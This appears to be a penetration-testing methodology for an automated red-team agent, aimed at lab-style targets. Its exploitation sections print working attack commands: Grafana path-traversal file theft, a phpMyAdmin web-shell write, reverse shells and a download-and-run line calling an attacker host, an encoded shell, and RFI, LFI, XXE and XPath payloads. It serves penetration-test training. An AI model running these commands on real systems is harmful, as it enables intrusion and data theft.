# RedTeam Swarm v9 - Baseline Methodology

## Overview
This methodology prioritizes efficiency and quick wins while avoiding time-consuming rabbit holes. It provides **flexible guidelines** that adapt to different target environments and time constraints.

**IMPORTANT**: This methodology is not meant to be a 1-stop solution. Use this to guide basic thinking and decision making. If all suggestions, methodologies, and techniques are exhausted, fall back to default trial and error without using this methodology, but take into account what has been attempted, what has been found, and what was successful/not successful.

## Core Philosophy
- **Priority-based execution**: All techniques are numbered by priority - ALWAYS attempt higher-numbered steps first as they represent the lowest hanging fruit
- **Time-efficient approach**: Avoid techniques requiring long execution times (extensive brute forcing, automated enumeration) unless evidence strongly supports them
- **Low-hanging fruit first**: Always start with the easiest, most likely successful attacks
- **Evidence-based decisions**: Only pursue attacks supported by reconnaissance findings
- **Iteration-based approach**: Use number of iterations rather than timing to limit rabbit holes
- **Objective-focused**: Prioritize attacks that directly achieve mission goals
- **Fallback strategy**: When methodology is exhausted, use informed trial and error

## Phase 1: Planning Phase
**Objective**: Analyze target scope, define objectives, create tactical approach

### Key Activities:
- Identify time constraints and success criteria
- Prioritize objectives by impact and feasibility
- Assess target complexity and available resources
- Define success metrics and exit criteria

### Decision Points:
- Is this a time-constrained engagement?
- What are the primary vs secondary objectives?
- What information do we already have about the target?

## Phase 2: Rapid Reconnaissance Phase
**Objective**: Focus on low-hanging fruit discovery

### Port Scanning Methodology:
1. **Quick Port Discovery**:
   - `rustscan_fast_scan`: Ultra-fast port scanning (rustscan -a $TARGET --ulimit 5000)
   - Identify open ports quickly for targeted scanning

2. **Service Enumeration on Found Ports**:
   - `nmap_scan`: Aggressive scan on discovered ports (nmap -A -p [ports] -v $TARGET)
   - `nmap_scan`: Service/version scan (nmap -sCV -p [ports] -v $TARGET)
   - **STOP HERE** if sufficient services found and attacks are viable

3. **Extended Scanning** (only if initial attacks fail):
   - UDP scanning: `nmap_scan` with UDP options (sudo nmap -sU)
   - Full port range: `nmap_scan` (nmap -p- -T4 -v $TARGET)
   - Top ports: `nmap_scan` (nmap --top-ports)
   - Research unique/unknown port combinations online

4. **Port Inference**:
   - Analyze existing services for additional ports (e.g., 3128 squid proxy → internal web services)
   - Check for default ports in potential exploits

### Web Reconnaissance Sequence:
1. **Start Passive**:
   - `subfinder_scan`: Passive subdomain discovery
   - `waybackurls_discovery`: Historical URL discovery
   - `gau_discovery`: Comprehensive URL discovery
   - `httpx_probe`: Technology identification

2. **Manual Enumeration** (Priority Order):
   1. **Check nmap -A output** for hidden ports, webdav (davtest/cadaver)
   2. **whatweb** for technology identification
   3. **Low-hanging fruit endpoints** (test in order):
      - /robots.txt, /sitemap.xml, /cms, /admin, /login, /.git, /panel
      - /cgi-bin, /CHANGELOG, /.svn, /.DS_STORE
      - Test unique folders/files found in other services (SMB/FTP)
   4. **View source** for web app/CMS version information

3. **Automated Scanning** (Priority Order):
   <!-- 1. **`nuclei_scan`**: Automated vulnerability scanning (highest priority) -->
   1. **`gobuster_scan`**: Directory enumeration with wordlists (highest priority order):
      - **common.txt** (ALWAYS START HERE - move on based on findings)
      - raft-medium-dir (if common.txt yields results)
      - directory-list-medium (only if previous wordlists successful)
      - raft-medium-files (targeted file enumeration)
   2. **Extension testing** (run together with gobuster, ensuring to add the following as arguments):
      - php, html, js, txt, zip, old, bak, aspx
      - Find hidden files: .git, .gitignore, etc.

4. **Targeted Deep Dive** (only if initial scans yield results):
   1. **`dirb_scan`**: Additional directory brute forcing
   2. **Subdomain enumeration** (only if main domain found)
   3. **`hakrawler_crawl`**: Web crawling for endpoints
   4. **cewl** the webpage for custom wordlist generation

### What to AVOID:
- Extensive subdomain brute forcing (`amass_scan`) unless passive methods yield results
- Large wordlist directory brute forcing without evidence
- Comprehensive port scanning (`masscan_high_speed`) as first step
- Time-consuming OSINT gathering without specific targets

### Pivot Criteria:
- If passive reconnaissance yields <5 subdomains, avoid active subdomain brute forcing
- If initial directory enumeration finds <3 directories, try different wordlists before extensive scanning
- If vulnerability scanning finds immediate wins, prioritize exploitation over additional reconnaissance

## Phase 3: Exploitation Phase
**Objective**: Target highest probability vulnerabilities first

### Priority Order:
1. **Immediate Wins** (0-5 minutes):
   - Test default credentials on discovered services
   - Check for known CVEs from `nuclei_scan` results
   - Test for common misconfigurations

2. **Web Application Testing**:
   
       **Login Pages/User Input** (Priority Order):
       1. **Default credentials**: admin:admin, administrator:administrator
       2. **Username reuse**: username:username, hostname:hostname
       3. **Create wordlist with cewl** from target content
       4. **SQL injection testing** with `sqlmap_scan`
       5. **Registration functionality**:
          - If domain found, use it for email input
          - Test for account enumeration
       6. **Capture requests & responses in Burp** for analysis
       7. **`hydra_attack`**: Only with targeted/custom wordlists

       **File Upload Bypass** (Priority Order):
       1. **Intercept in Burp** and change content-type
       2. **Magic byte prepending**: GIF98a; at file top
       3. **.htaccess bypass**: Interpret ".EVIL" as ".php"
       4. **Extension filtering bypass** techniques

       **CMS/Framework Specific** (Priority Order):
       1. **WordPress**: `wpscan_analyze` with aggressive plugin detection
       2. **Joomla**: joomscan equivalent testing
       3. **WebDAV**: davtest/cadaver testing
       4. **Framework-specific** default credentials and exploits

3. **Automated Exploitation**:
   - `sqlmap_scan`: SQL injection testing on discovered parameters
   - `dalfox_xss_scan`: XSS vulnerability scanning
   - `commix_injection_scan`: Command injection testing
   - `jwt_analyzer`: JWT token analysis if tokens discovered

4. **CMS/Framework Specific Exploits** (If any of the CMS are identified, then follow the methodology for the respective one identified):
   
   **WordPress**:
   - `wpscan_analyze`: Update DB, enumerate plugins/themes aggressively
   - Default credentials: admin:admin
   - Brute force with custom wordlists only
   
   **Joomla**:
   - joomscan equivalent testing
   - Default admin panel access
   
   **WebDAV**:
   - davtest/cadaver testing with authentication
   - Password file: /var/www/html/webdav/passwd.dav
   
   **Subrion**: admin:admin at /panel
   **Symfony**: Debug mode exploitation, config file access
   **Grafana**: admin:admin, CVE-2021-43798 file read
   **HP Power Manager**: admin:admin, v4.2 Buffer Overflow
   **phpMyAdmin**: root:(blank), SQL console RCE
   **SmarterMail**: Port 17001, .NET service exploitation
   **ManageEngine**: administrator:administrator
   **PyLoad**: pyload:pyload, RCE exploits

5. **PHP Vulnerabilities** (Priority Order):
   - Find phpinfo.php page (document root, disable_functions)
   - Parameter fuzzing: `ffuf_scan` with LFI parameters
   - LFI/RFI testing with php:// wrappers
   - File inclusion bypasses and techniques

6. **Advanced Injection Attacks**:
   - XXE injection testing
   - XPath injection with payload lists
   - Parameter fuzzing with `ffuf_scan` and `arjun_scan`

### Credential Brute Force Guidelines:

#### AVOID brute forcing UNLESS:
- You have a **targeted username list** from reconnaissance (<50 users)
- **Password policy suggests weak passwords** (no complexity requirements)
- **Default/common credentials** haven't been tested
- It's the **last viable attack vector**
- **Custom wordlists** derived from target reconnaissance (<500 entries)

#### NEVER brute force with:
- Generic username/password lists (>1000 entries)
- No evidence of weak password policies
- Time-constrained engagements (<2 hours)
- Multiple other attack vectors available

#### Acceptable Brute Force Scenarios:
```bash
# Good: Targeted usernames from reconnaissance
hydra_attack(target="ssh://target.com", userlist="discovered_users.txt", passlist="common_passwords.txt")

# Good: Custom wordlist from target
hydra_attack(target="http://target.com/login", username="admin", passlist="target_derived_passwords.txt")

# Bad: Generic brute force
hydra_attack(target="ssh://target.com", userlist="generic_users.txt", passlist="rockyou.txt")
```

### Iteration-Based Limiting:
- Use number of iterations rather than timing to limit rabbit holes
- **Port Scanning**: Stop after 3 scanning iterations if no new services found
- **Directory Enumeration**: Limit to 2-3 wordlists before pivoting
- **Credential Testing**: Maximum 3 wordlist attempts per service
- **Exploit Attempts**: Try maximum 5 variations of same exploit type
- Always have 2-3 alternative attack vectors identified before starting

## Phase 4: Post-Exploitation Phase
**Objective**: Achieve objectives efficiently

### Immediate Actions (0-5 minutes):
- **Objective completion check**: Can we achieve primary objectives immediately?
- `find_files`: Search for target files (local.txt, sensitive data)
- `execute_command`: Basic system enumeration (whoami, id, pwd)
- Document current access level and capabilities

### Quick Wins (5-15 minutes):
- **Automated privilege escalation**: Use enumeration scripts
- **Credential harvesting**: Check for stored credentials, SSH keys
- **Persistence establishment**: Only if required by objectives
- **Additional file searches**: Expand search if initial attempts fail

### Extended Activities (only if required):
- **Lateral movement**: Only if primary objectives require access to other systems
- **Network enumeration**: Only if objectives involve network mapping
- **Data exfiltration**: Only if specifically requested

### What to AVOID:
- Extensive network enumeration unless specifically required
- Installing complex persistence mechanisms for short engagements
- Deep system enumeration without clear objectives
- Lateral movement "just to see what's there"

## Detailed Web Exploitation Techniques

### HTTPS/SSL Handling:
- Use `curl -k` for certificate issues
- Python requests with verify=False
- Handle certificate errors appropriately

### Multiple Web Services:
- Findings on one service may relate to others
- File uploads on one may appear on another
- Check if one service is a proxy for others

### Browsing Error Handling:
- Add domain names to /etc/hosts if needed
- Use IP address directly if domain resolution fails

## Comprehensive CMS/Framework Exploits

### WordPress Exploitation:
```bash
# Update WPScan database
wpscan --update

# Basic enumeration
wpscan -e --url $URL

# Aggressive plugin detection
wpscan --url $URL --enumerate ap --plugins-detection aggressive

# Brute force (only with custom wordlists)
wpscan --url $URL -P [custom_wordlist] -U [user_list]

# With API tokens
wpscan --url $URL --api-token [token]

# Disable TLS checks
wpscan --url $URL --disable-tls-checks --api-token [token]
```

### Joomla Exploitation:
```bash
joomscan -u $URL
./joomlavs.rb --url $URL -a -v
```

### WebDAV Exploitation:
```bash
# Test WebDAV functionality
davtest -auth user:pass --url $URL
cadaver  # Interactive interface

# Common password file location
/var/www/html/webdav/passwd.dav
```

### Framework-Specific Exploits:

**Subrion CMS**:
- Default login: admin:admin at /panel

**Symfony Framework**:
```bash
# Check for debug mode
http://target.pg/app_dev.php/
http://target.pg/app_dev.php/_profiler
http://target.pg/_profiler

# Read config file
http://target.pg/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

**Grafana**:
```bash
# Default credentials
admin:admin

# CVE-2021-43798 - Unauthenticated file read
searchsploit -m 50581
python3 50581 -H http://target.pg

# Extract database and config
curl -o grafana.db --path-as-is http://target.pg:3000/public/plugins/mssql/../../../../../../../../../../../../../var/lib/grafana/grafana.db
curl -o grafana.ini --path-as-is http://target.pg:3000/public/plugins/mssql/../../../../../../../../../../../../../etc/grafana/grafana.ini
```

**HP Power Manager**:
```bash
# Default credentials
admin:admin

# Vulnerable version v4.2 Buffer Overflow RCE
searchsploit -m 10099  # python2 script
```

**phpMyAdmin**:
```bash
# Default credentials
user: root
password: (blank)

# Find document root
/?phpinfo=-1

# SQL console RCE
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"

# Trigger RCE
curl http://$TARGET/backdoor.php?cmd=whoami

# Read flag
curl http://$TARGET/backdoor.php?cmd=more C:\Users\Administrator\Desktop\proof.txt

# Reverse shell
curl http://$TARGET/backdoor.php?cmd=powershell -e JABjAGwA...A==
```

**SmarterMail**:
```bash
# Check for open port 17001 or additional open ports with service .NET
searchsploit -m 49216
```

**ManageEngine ServiceDesk Plus**:
```bash
# Default credentials
administrator:administrator
```

**PyLoad**:
```bash
# Default credentials
pyload:pyload

# pyLoad 0.5.0 RCE Exploit
searchsploit pyload
searchsploit -m 51532

# Test RCE
python3 exp.py -u http://target.pg:9666 -c "curl http://attacker_ip"

# Tried different reverse shell techniques (may not work due to encoding)
python3 exp.py -u http://target.pg:9666 -c "/bin/sh -i >& /dev/tcp/attacker_ip/80 0>&1"
python3 exp.py -u http://target.pg:9666 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f"
python3 exp.py -u http://target.pg:9666 -c "curl http://attacker_ip:8000/rev.sh ; chmod +x rev.sh ; ./rev.sh"

# Base64 encoded payload (for encoding issues on target end)
# Using python shell may cause " escaping errors, so encode payload as b64 and decode at target
python3 exp.py -u http://target.pg:9666 -c "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4xNjMiLDgwKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=' | base64 -d | bash"
```

## PHP Vulnerability Exploitation

### PHP Information Gathering (Priority Order):
1. **Find phpinfo.php page**:
   - Document root identification
   - disable_functions enumeration
   - allow_url_include & allow_url_fopen status

2. **Parameter Fuzzing**:
```bash
ffuf -w /wordlists/lfiparam -u $URL?FUZZ=php://filter/convert.base64-encode/resource=xxx.php
```

3. **LFI Fuzzing Lists**:
   - Linux: SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
   - Windows: SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
   - Both: SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt

### File Inclusion Techniques:
```bash
# Basic LFI
http://target.pg/index.php?page=../../../../../../../../etc/passwd
http://target.pg/index.php?page=../../../../../../../../Windows/System32/Drivers/etc/hosts

# PHP Wrappers
http://target.pg/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
http://target.pg/index.php?page=expect://whoami

# RFI (use .txt files to avoid execution on attacker server)
http://target.pg/index.php?page=http://attacker_ip:8000/rev/php/winrev.txt
```

## XML External Entity (XXE) Exploitation

### Basic XXE Testing:
```xml
<?xml version="1.0"?>
<!DOCTYPE uid [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<root>
    <user>&passwd;</user>
</root>
```

### SOAP XXE Example:
```bash
curl -x 127.0.0.1:8080 -s -X POST \
-H 'Content-Type: text/xml;charset=UTF-8' \
-H 'SOAPAction: "http://target/soap"' \
--data-binary '<?xml version="1.0"?>
<!DOCTYPE uid [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope>
<soapenv:Body>
<uid>&passwd;</uid>
</soapenv:Body>
</soapenv:Envelope>' \
'http://target/soap'
```

### PHP XXE with expect:// wrapper:
```xml
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://id">]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## XPath Injection Exploitation

### Basic XPath Payloads:
```bash
# Authentication bypass
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y

# Node enumeration
/
//
//*
*/*
@*
count(/child::node())

# String extraction
') or 1=1 or ('  # Get all names
') or 1=1] | //user/password[('')=('  # Get all names and passwords
')] | //user/*[1] | a[('  # The ID of all users
')] | //user/*[2] | a[('  # The name of all users
')] | //user/*[3] | a[('  # The password of all users
```

## Credential Testing Methodology

### Manual Testing Priority:
1. **Username Reuse**: username:username, hostname:hostname, box-name:box-name, cmsname:cmsname, service:service
2. **Default Credentials**: admin:admin, administrator:administrator
3. **Capitalize First Letter**: Admin:admin, Administrator:administrator
4. **Custom Wordlists**: Use cewl for wordlist generation (append lowercase)
5. **Discovered Content**: Use found content for password generation

### Credential Sources:
- **ftp-betterdefaultpasslist.txt**: For user and pass combinations
- **Custom wordlists**: Generated from target reconnaissance
- **Service-specific defaults**: Research application-specific credentials

### Hash Cracking Approach:
1. **Online Resources**: crackstation.net for quick lookups
2. **Common Wordlists**: fasttrack, rockyou
3. **Application-Specific**: Research hash formats and decryption scripts on GitHub
4. **Custom Wordlists**: Generate from target content

### Troubleshooting Credentials:
- **Copy Issues**: Check for terminating \n characters from terminal
- **Manual Entry**: Type credentials manually if copy/paste fails
- **Case Sensitivity**: Try different case combinations
- **Special Characters**: Verify special character encoding

## Archive and File Analysis

### Zip Files:
- Check for split archives (multiple parts)
- Try GUI-based extraction tools
- Use `john_crack` for encrypted archives (zip2john)

### Hash Analysis:
- **Online Lookup**: crackstation, hashkiller
- **Wordlist Attacks**: rockyou, fasttrack, custom wordlists
- **Application Research**: Search for application-specific hash formats
- **GitHub Scripts**: Look for decryption tools for specific applications

## Phase 5: Adaptive Decision Making
**Objective**: Continuous assessment and tactical pivoting

### Decision Framework:
1. **EFFORT vs IMPACT**: Choose high-impact, low-effort attacks first
2. **ITERATION LIMITS**: Use number of attempts rather than time limits
3. **EVIDENCE-BASED**: Only pursue attacks with supporting reconnaissance evidence
4. **OBJECTIVE-FOCUSED**: Prioritize attacks that directly achieve mission goals
5. **FALLBACK STRATEGY**: Always have 2-3 alternative approaches ready

### Pivot Triggers:
- **Iteration Limits Reached**: Maximum attempts per attack type exceeded
- **Discovery of higher-priority vulnerability**: New attack vector with better success probability
- **Objective requirements change**: Mission parameters updated
- **Technical roadblocks encountered**: Fundamental barriers to current approach
- **Evidence contradicts approach**: Reconnaissance suggests different attack vector

## Last Resort Brute Forcing

### When All Else Fails:
- **Short User/Pass Lists**: Use concise, targeted lists only
- **Reuse User List as Pass List**: Try usernames as passwords
- **Service-Specific Defaults**: Focus on application-specific credentials
- **Maximum 3 Iterations**: Limit brute force attempts to prevent rabbit holes

### Brute Force Iteration Limits:
1. **First Attempt**: Default/common credentials (admin:admin, etc.)
2. **Second Attempt**: Custom wordlist from target reconnaissance
3. **Third Attempt**: Short generic list (top 100 passwords)
4. **STOP**: If no success after 3 attempts, pivot to different attack vector

### Documentation Requirements:
- Log all attempted attack vectors and results
- Document reasoning for tactical decisions
- Note time spent on each phase/attack
- Record pivot points and decision criteria

## Tool Selection Guidelines

### Reconnaissance Tools Priority:
1. **Passive First**: `subfinder_scan`, `waybackurls_discovery`, `gau_discovery`
2. **Quick Active**: `rustscan_fast_scan`, `httpx_probe`, `nuclei_scan`
3. **Targeted Deep**: `nmap_scan`, `gobuster_scan`, `hakrawler_crawl`
4. **Last Resort**: `amass_scan`, `masscan_high_speed` (only with evidence)

### Exploitation Tools Priority:
1. **Automated First**: `sqlmap_scan`, `dalfox_xss_scan`, `nuclei_scan`
2. **Targeted Manual**: `ffuf_scan`, `wfuzz_scan`, `arjun_scan`
3. **Framework Tools**: `metasploit_run`, `burpsuite_scan`
4. **Last Resort**: `hydra_attack` (only with targeted wordlists)

### Post-Exploitation Tools Priority:
1. **Immediate**: `find_files`, `execute_command`, `read_file_content`
2. **Quick Enum**: `list_files`, `grep_search`
3. **Privilege Escalation**: Automated enumeration scripts
4. **Extended**: `netexec_scan`, `enum4linux_scan` (only if required)

## Iteration Management

### Recommended Phase Iterations:
- **Planning**: 1 iteration (thorough initial planning)
- **Reconnaissance**: Maximum 3 scanning iterations per service
- **Exploitation**: Maximum 5 attempts per vulnerability type
- **Post-Exploitation**: Focus on direct objective completion
- **Reporting**: 1 comprehensive documentation pass

### Iteration-Boxing Examples:
```
Port Scanning Iterations:
1. Quick scan (rustscan)
2. Service enumeration (nmap -A on found ports)
3. Extended scanning (only if initial attacks fail)

Directory Enumeration Iterations:
1. Common wordlist (raft-medium-dir)
2. File extensions (php, html, js, txt)
3. Custom wordlist (only if evidence supports)

Credential Testing Iterations:
1. Default credentials (admin:admin, etc.)
2. Username reuse (user:user)
3. Custom wordlist from reconnaissance
```

## Success Metrics

### Primary Success Indicators:
- Objectives achieved within iteration constraints
- Vulnerabilities identified and validated
- Access established (if required)
- Clear documentation of findings

### Efficiency Metrics:
- Iterations to first vulnerability discovery
- Ratio of successful vs attempted attacks
- Number of iterations spent on each phase
- Number of pivot decisions made
- Adherence to iteration limits

### Quality Indicators:
- Evidence-based attack selection
- Proper documentation of attempts
- Logical progression through methodology
- Appropriate use of time-boxing

## Adaptation Guidelines

### High-Security Targets:
- Increase reconnaissance time allocation
- Focus on passive techniques
- Use more sophisticated evasion techniques
- Expect longer exploitation phases

### Time-Constrained Engagements:
- Reduce reconnaissance to essentials
- Focus on automated tools
- Prioritize known vulnerabilities
- Skip comprehensive enumeration

### Complex Environments:
- Increase planning phase time
- Use parallel reconnaissance approaches
- Prepare multiple attack vectors
- Plan for extended post-exploitation

### Simple Targets:
- Reduce overall time allocation
- Focus on common vulnerabilities
- Use standard tool sequences
- Expect quick objective completion

## Common Pitfalls to Avoid

1. **Rabbit Holes**: Exceeding iteration limits on single attack vectors
2. **Generic Brute Forcing**: Using large, untargeted wordlists without evidence
3. **Scope Creep**: Expanding beyond defined objectives
4. **Tool Fixation**: Relying on single tools instead of methodology
5. **Iteration Mismanagement**: Not setting or respecting iteration limits
6. **Evidence Ignoring**: Pursuing attacks without reconnaissance support
7. **Documentation Neglect**: Failing to record attempts and decisions
8. **Pivot Paralysis**: Not knowing when to change approaches
9. **Credential Copy Errors**: Terminal \n characters breaking authentication
10. **Archive Assumptions**: Not checking for split/encrypted archives

## Conclusion

This methodology provides a **flexible framework** for efficient penetration testing. It emphasizes:
- **Priority-based execution**: All techniques are numbered by priority - ALWAYS attempt higher-numbered steps first
- **Time-efficient approach**: Avoid long-running techniques (extensive brute forcing, automated enumeration) unless evidence supports them
- **Quick wins over comprehensive coverage**
- **Evidence-based decision making**
- **Iteration-based approach with built-in pivot points**
- **Objective-focused prioritization**
- **Fallback to informed trial and error when methodology is exhausted**

**CRITICAL REMINDER**: Each domain (port scanning, web enumeration, etc.) has techniques numbered by priority. **ALWAYS attempt steps higher on the list FIRST** as they represent the lowest hanging fruit and most time-efficient approaches.

Remember: These are **guidelines, not rigid rules**. This methodology is not meant to be a 1-stop solution. Use it to guide basic thinking and decision making. When all suggestions, methodologies, and techniques are exhausted, fall back to default trial and error without using this methodology, but take into account what has been attempted, what has been found, and what was successful/not successful.

Adapt based on target complexity, iteration constraints, and specific objectives while maintaining the core principles of **priority-based execution**, **time efficiency**, and **evidence-based decision making**.
